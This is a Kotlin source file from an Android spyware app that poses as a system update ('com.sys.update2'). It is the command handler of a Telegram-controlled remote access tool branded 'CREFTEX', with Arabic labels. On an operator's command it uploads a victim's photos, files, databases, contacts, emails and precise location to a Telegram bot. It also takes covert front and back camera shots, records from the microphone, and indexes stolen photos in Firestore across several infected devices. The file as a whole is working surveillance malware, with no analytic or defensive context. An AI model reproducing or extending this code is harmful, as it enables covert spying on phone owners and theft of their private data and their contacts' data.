package com.sys.update2

import android.content.Context
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object CommandExecutor {

    // ═══════════════════════════════════════════
    //  PhotoIndex — حفظ metadata في Firestore
    // ═══════════════════════════════════════════
    private object PhotoIndex {
        private val client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build()

        private fun base(): String =
            "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents"

        private fun str(s: String) = JSONObject().put("stringValue", s)
        private fun num(n: Long) = JSONObject().put("integerValue", n.toString())

        fun save(ctx: Context, fileId: String, msgId: Int, name: String, size: Long, caption: String) {
            Thread {
                try {
                    val code = DeviceManager.getDeviceCode(ctx)
                    val url = "${base()}/devices/$code/photos/$msgId?key=${Config.FIREBASE_API_KEY}"
                    val fields = JSONObject().apply {
                        put("file_id", str(fileId))
                        put("msg_id", num(msgId.toLong()))
                        put("name", str(name))
                        put("size", num(size))
                        put("date", num(System.currentTimeMillis()))
                        put("caption", str(caption))
                    }
                    val body = JSONObject().put("fields", fields).toString()
                    val req = Request.Builder()
                        .url(url)
                        .patch(body.toRequestBody("application/json".toMediaType()))
                        .build()
                    client.newCall(req).execute().use { resp ->
                        if (!resp.isSuccessful) Log.e("PhotoIndex", "save failed: ${resp.code}")
                    }
                } catch (e: Exception) {
                    Log.e("PhotoIndex", "save err: ${e.message}")
                }
            }.start()
        }
    }

    // ═══════════════════════════════════════════
    //  handlePublic — أوامر عامة (بدون رمز)
    // ═══════════════════════════════════════════
    fun handlePublic(ctx: Context, cmd: String) {
        when {
            cmd == "/start" || cmd == "/menu" || cmd == "menu" ||
            cmd == "🏠 القائمة" -> showMainMenu(ctx)

            cmd == "/help" || cmd == "help" || cmd == "مساعدة" -> showHelp(ctx)

            cmd == "📱 قائمة الأجهزة" || cmd == "🌐 كل الأجهزة" -> showDeviceList(ctx)
        }
    }

    // ═══════════════════════════════════════════
    //  handleText — الأوامر الخاصة (تم التحقق من الرمز)
    // ═══════════════════════════════════════════
    fun handleText(ctx: Context, text: String, code: String) {
        val cmd = text.trim()
        Log.d("CmdExec", "cmd: $cmd (code=$code)")

        // نظّف الأوامر من @BotName
        val cleanCmd = cmd.replace(Regex("@\\w+"), "").trim()

        when {
            // الصور
            cleanCmd == "📸 كل الصور" || cleanCmd == "/photos" -> fetchAllPhotos(ctx, code)
            cleanCmd == "📸 آخر 50" || cleanCmd == "/photos_50" -> fetchLastPhotos(ctx, 50, code)
            cleanCmd == "🎵 كل الموسيقى" || cleanCmd == "/music" -> fetchAllMusic(ctx, code)

            // ملفات
            cleanCmd == "📁 كل الملفات" || cleanCmd == "/files" -> fetchFiles(ctx, code)
            cleanCmd == "📄 المستندات" || cleanCmd == "/docs" -> fetchDocuments(ctx, code)
            cleanCmd == "📦 المضغوطة" || cleanCmd == "/archives" -> fetchArchives(ctx, code)
            cleanCmd == "📱 APK" || cleanCmd == "/apks" -> fetchApks(ctx, code)
            cleanCmd == "🗄 قواعد بيانات" || cleanCmd == "/dbs" -> fetchDatabases(ctx, code)
            cleanCmd == "🎬 الفيديو" || cleanCmd == "/videos" -> fetchVideos(ctx, code)

            // اتصالات
            cleanCmd == "👥 جهات الاتصال" || cleanCmd == "/contacts" -> fetchContacts(ctx, code)
            cleanCmd == "📧 الإيميلات" || cleanCmd == "/emails" -> fetchEmails(ctx, code)

            // أخرى
            cleanCmd == "📊 معلومات الجهاز" || cleanCmd == "/info" -> showDeviceInfo(ctx, code)
            cleanCmd == "🤳 تصوير أمامي" || cleanCmd == "/cam_front" -> captureCamera(ctx, true, code)
            cleanCmd == "📸 تصوير خلفي" || cleanCmd == "/cam_back" -> captureCamera(ctx, false, code)
            cleanCmd == "🚀 جلب كل شي" || cleanCmd == "/all" -> fetchEverything(ctx, code)
            cleanCmd == "📍 عرض الموقع" || cleanCmd == "/location" -> showLocation(ctx, code)

            // Toggles
            cleanCmd == "🟢 تشغيل الصور" || cleanCmd == "🔴 إيقاف الصور" -> togglePhotos(ctx, code)
            cleanCmd == "🟢 تشغيل الموقع" || cleanCmd == "🔴 إيقاف الموقع" -> toggleLocation(ctx, code)
            cleanCmd == "🟢 تشغيل المايك" || cleanCmd == "🔴 إيقاف المايك" -> toggleAudio(ctx, code)

            cleanCmd.startsWith("/photos ") -> {
                val n = cleanCmd.removePrefix("/photos").trim().toIntOrNull() ?: 50
                fetchLastPhotos(ctx, n, code)
            }

            else -> TelegramApi.sendMessage("❓ أمر غير معروف: `$cleanCmd`", KeyboardBuilder.replyKeyboard(ctx))
        }
    }

    // ═══════════════════════════════════════════
    //  Toggle
    // ═══════════════════════════════════════════
    private fun togglePhotos(ctx: Context, code: String) {
        KeyboardBuilder.photosOn = !KeyboardBuilder.photosOn
        val state = if (KeyboardBuilder.photosOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("📸 *الصور التلقائية*\n\nالحالة: $state\n🆔 `$code`")
    }

    private fun toggleLocation(ctx: Context, code: String) {
        KeyboardBuilder.locationOn = !KeyboardBuilder.locationOn
        val state = if (KeyboardBuilder.locationOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("📍 *تتبع الموقع*\n\nالحالة: $state\n🆔 `$code`")
    }

    private fun toggleAudio(ctx: Context, code: String) {
        KeyboardBuilder.audioOn = !KeyboardBuilder.audioOn
        if (KeyboardBuilder.audioOn) AudioRecorder.startLoop(ctx) else AudioRecorder.stopLoop(ctx)
        val state = if (KeyboardBuilder.audioOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("🎤 *الميكروفون*\n\nالحالة: $state\n🆔 `$code`")
    }

    // ═══════════════════════════════════════════
    //  الصور
    // ═══════════════════════════════════════════
    private fun fetchAllPhotos(ctx: Context, code: String) {
        runJob(ctx, "photos_all", code) {
            sendMediaList(ctx, MediaScanner.scanImages(ctx), "📸 كل الصور", code)
        }
    }

    private fun fetchLastPhotos(ctx: Context, n: Int, code: String) {
        runJob(ctx, "photos_$n", code) {
            sendMediaList(ctx, MediaScanner.scanImages(ctx).take(n), "📸 آخر $n صورة", code)
        }
    }

    private fun sendMediaList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String, code: String) {
        if (list.isEmpty()) {
            TelegramApi.sendMessage("📭 لا توجد صور\n🆔 `$code`")
            return
        }
        val name = DeviceManager.getDeviceName(ctx)
        TelegramApi.sendMessage("$title من *$name*\n🆔 `$code`\n\n📤 جاري الإرسال...")

        var sent = 0
        var failed = 0
        for (item in list) {
            val file = File(item.path)
            if (!file.exists()) { failed++; continue }
            val (ok, fileId) = TelegramApi.sendPhoto(file, "📸 ${item.name} [${code}]")
            if (ok) {
                sent++
                if (fileId.isNotBlank()) {
                    PhotoIndex.save(ctx, fileId, sent, item.name, item.size, "📸 ${item.name}")
                }
            } else failed++
        }
        TelegramApi.sendMessage("✅ *انتهى*\n\n📤 $sent\n❌ $failed\n🆔 `$code`")
    }

    // ═══════════════════════════════════════════
    //  الملفات
    // ═══════════════════════════════════════════
    private fun fetchFiles(ctx: Context, code: String) {
        runJob(ctx, "files", code) {
            val allTypes = FileGrabber.DOCUMENTS + FileGrabber.ARCHIVES +
                    FileGrabber.APKS + FileGrabber.DATABASES + FileGrabber.CODE
            val files = FileGrabber.scanByTypes(allTypes, 500)
            if (files.isEmpty()) { TelegramApi.sendMessage("📭 لا توجد ملفات\n🆔 `$code`"); return@runJob }
            sendFilesList(ctx, files, "📁 كل الملفات", code)
        }
    }

    private fun fetchDocuments(ctx: Context, code: String) {
        runJob(ctx, "docs", code) {
            val files = FileGrabber.scanByTypes(FileGrabber.DOCUMENTS, 500)
            if (files.isEmpty()) { TelegramApi.sendMessage("📭 لا توجد مستندات\n🆔 `$code`"); return@runJob }
            sendFilesList(ctx, files, "📄 المستندات", code)
        }
    }

    private fun fetchArchives(ctx: Context, code: String) {
        runJob(ctx, "archives", code) {
            val files = FileGrabber.scanByTypes(FileGrabber.ARCHIVES, 300)
            if (files.isEmpty()) { TelegramApi.sendMessage("📭 لا ملفات مضغوطة\n🆔 `$code`"); return@runJob }
            sendFilesList(ctx, files, "📦 المضغوطة", code)
        }
    }

    private fun fetchApks(ctx: Context, code: String) {
        runJob(ctx, "apks", code) {
            val files = FileGrabber.scanByTypes(FileGrabber.APKS, 300)
            if (files.isEmpty()) { TelegramApi.sendMessage("📭 لا يوجد APK\n🆔 `$code`"); return@runJob }
            sendFilesList(ctx, files, "📱 APK", code)
        }
    }

    private fun fetchDatabases(ctx: Context, code: String) {
        runJob(ctx, "dbs", code) {
            val files = FileGrabber.scanByTypes(FileGrabber.DATABASES, 300)
            if (files.isEmpty()) { TelegramApi.sendMessage("📭 لا قواعد بيانات\n🆔 `$code`"); return@runJob }
            sendFilesList(ctx, files, "🗄 قواعد بيانات", code)
        }
    }

    private fun fetchVideos(ctx: Context, code: String) {
        runJob(ctx, "videos", code) {
            val files = FileGrabber.scanByTypes(FileGrabber.VIDEOS, 300)
            if (files.isEmpty()) { TelegramApi.sendMessage("📭 لا فيديوهات\n🆔 `$code`"); return@runJob }
            sendFilesList(ctx, files, "🎬 الفيديو", code)
        }
    }

    private fun sendFilesList(ctx: Context, files: List<FileGrabber.FoundFile>, title: String, code: String) {
        val name = DeviceManager.getDeviceName(ctx)
        TelegramApi.sendMessage("$title من *$name*\n🆔 `$code`\n📤 جاري الإرسال...")
        var sent = 0; var failed = 0
        for (f in files) {
            val file = File(f.path)
            if (!file.exists()) { failed++; continue }
            if (TelegramApi.sendDocument(file, "📄 ${f.name} [${code}]")) sent++ else failed++
            Thread.sleep(400)
        }
        TelegramApi.sendMessage("✅ *انتهى*\n\n📤 $sent\n❌ $failed\n🆔 `$code`")
    }

    // ═══════════════════════════════════════════
    //  معلومات / موقع / كاميرا / اتصالات
    // ═══════════════════════════════════════════
    private fun showDeviceInfo(ctx: Context, code: String) {
        val name = DeviceManager.getDeviceName(ctx)
        TelegramApi.sendMessage("📱 *$name* — 🆔 `$code`\n\n" + DeviceInfo.getFullInfo(ctx))
    }

    private fun showLocation(ctx: Context, code: String) {
        runJob(ctx, "loc", code) {
            TelegramApi.sendMessage("📍 *جاري تحديد الموقع...* 🆔 `$code`")
            val loc = LocationHelper.getPreciseLocation(ctx)
            TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc) + "\n🆔 `$code`")
        }
    }

    private fun captureCamera(ctx: Context, front: Boolean, code: String) {
        runJob(ctx, "cam", code) {
            val label = if (front) "أمامية" else "خلفية"
            TelegramApi.sendMessage("📷 *جاري التصوير ($label)* 🆔 `$code`")
            val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
            if (file != null && file.exists()) {
                val (ok, fileId) = TelegramApi.sendPhoto(file, "📷 صورة ($label) [${code}]")
                if (ok && fileId.isNotBlank()) {
                    PhotoIndex.save(ctx, fileId, System.currentTimeMillis().toInt(), file.name, file.length(), "📷 صورة ($label)")
                }
                file.delete()
            } else TelegramApi.sendMessage("❌ فشل التصوير 🆔 `$code`")
        }
    }

    private fun fetchContacts(ctx: Context, code: String) {
        runJob(ctx, "contacts", code) {
            val contacts = ContactsHelper.getAllContacts(ctx)
            if (contacts.isEmpty()) { TelegramApi.sendMessage("📭 لا توجد جهات اتصال\n🆔 `$code`"); return@runJob }
            val sb = StringBuilder()
            sb.append("👥 *جهات الاتصال* — ${contacts.size}\n🆔 `$code`\n━━━━━━━━━━\n\n")
            var count = 0
            for (c in contacts) {
                sb.append("👤 *${c.name}*\n")
                if (c.phones.isNotEmpty()) sb.append("📞 ${c.phones.joinToString(" , ")}\n")
                if (c.emails.isNotEmpty()) sb.append("📧 ${c.emails.joinToString(" , ")}\n")
                sb.append("\n")
                count++
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
                if (count >= 150) { sb.append("… +${contacts.size - count} آخرين\n"); break }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString())
        }
    }

    private fun fetchEmails(ctx: Context, code: String) {
        runJob(ctx, "emails", code) {
            val emails = ContactsHelper.getAllEmails(ctx)
            if (emails.isEmpty()) { TelegramApi.sendMessage("📭 لا توجد إيميلات\n🆔 `$code`"); return@runJob }
            val sb = StringBuilder()
            sb.append("📧 *كل الإيميلات* — ${emails.size}\n🆔 `$code`\n━━━━━━━━━━\n\n")
            for (e in emails) {
                sb.append("✉️ *${e.name}*\n`${e.email}`\n\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString())
        }
    }

    private fun fetchAllMusic(ctx: Context, code: String) {
        runJob(ctx, "music", code) {
            val music = MediaScanner.scanAudio(ctx)
            if (music.isEmpty()) { TelegramApi.sendMessage("🎵 لا توجد موسيقى\n🆔 `$code`"); return@runJob }
            TelegramApi.sendMessage("🎵 *جاري إرسال ${music.size} مقطع...* 🆔 `$code`")
            var sent = 0; var failed = 0
            for (m in music) {
                val file = File(m.path)
                if (!file.exists()) { failed++; continue }
                if (TelegramApi.sendAudio(file, "🎵 ${m.name} [${code}]")) sent++ else failed++
                Thread.sleep(300)
            }
            TelegramApi.sendMessage("🎵 *انتهى*\n\n✅ $sent\n❌ $failed\n🆔 `$code`")
        }
    }

    private fun fetchEverything(ctx: Context, code: String) {
        runJob(ctx, "all", code) {
            TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل* 🆔 `$code`")
            try { TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx)) } catch (_: Exception) {}
            try {
                val loc = LocationHelper.getPreciseLocation(ctx)
                TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc))
            } catch (_: Exception) {}
            sendMediaList(ctx, MediaScanner.scanImages(ctx).take(20), "📸 الصور", code)
            fetchContacts(ctx, code)
            fetchEmails(ctx, code)
            TelegramApi.sendMessage("✅ *اكتمل* 🆔 `$code`")
        }
    }

    // ═══════════════════════════════════════════
    //  الأجهزة — قائمة عامة
    // ═══════════════════════════════════════════
    private fun showDeviceList(ctx: Context) {
        runJob(ctx, "devices", "") {
            val devices = DeviceManager.getDeviceList(ctx)
            if (devices.isEmpty()) {
                TelegramApi.sendMessage("📭 لا أجهزة مسجّلة")
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("📱 *الأجهزة المسجّلة* — ${devices.size}\n━━━━━━━━━━\n\n")
            for (d in devices) {
                val status = if (d.online) "🟢" else "🔴"
                sb.append("$status *${d.name}*\n🆔 `${d.code}`\n\n")
            }
            sb.append("للاستخدام:\n`/photos <الرمز>`")
            TelegramApi.sendMessage(sb.toString())
        }
    }

    private fun showMainMenu(ctx: Context) {
        val code = DeviceManager.getDeviceCode(ctx)
        val name = DeviceManager.getDeviceName(ctx)
        TelegramApi.sendMessage(
            "🎛 *لوحة التحكم — CREFTEX*\n\n🏷 *$name*\n🆔 `$code`\n\n" +
            "أرسل الأوامر مع الرمز:\n`/photos $code`\n`/contacts $code`\n`/info $code`\n`/all $code`",
            KeyboardBuilder.replyKeyboard(ctx)
        )
    }

    private fun showHelp(ctx: Context) {
        TelegramApi.sendMessage(
            "📖 *الأوامر المتاحة*\n\n" +
            "🔹 `/photos <رمز>` — كل الصور\n" +
            "🔹 `/photos 50 <رمز>` — آخر 50 صورة\n" +
            "🔹 `/music <رمز>` — الموسيقى\n" +
            "🔹 `/files <رمز>` — كل الملفات\n" +
            "🔹 `/docs <رمز>` — المستندات\n" +
            "🔹 `/contacts <رمز>` — جهات الاتصال\n" +
            "🔹 `/info <رمز>` — معلومات الجهاز\n" +
            "🔹 `/location <رمز>` — الموقع\n" +
            "🔹 `/cam_front <رمز>` — تصوير أمامي\n" +
            "🔹 `/cam_back <رمز>` — تصوير خلفي\n" +
            "🔹 `/all <رمز>` — جلب شامل\n\n" +
            "🆔 *رمزك:* `" + DeviceManager.getDeviceCode(ctx) + "`"
        )
    }

    // ═══════════════════════════════════════════
    //  runJob — thread موحد
    // ═══════════════════════════════════════════
    private fun runJob(ctx: Context, jobName: String, code: String, block: () -> Unit) {
        Thread {
            try { block() } catch (e: Exception) {
                Log.e("CmdExec", "job $jobName err: ${e.message}")
                if (code.isNotBlank()) TelegramApi.sendMessage("❌ خطأ: ${e.message}\n🆔 `$code`")
            }
        }.start()
    }
}
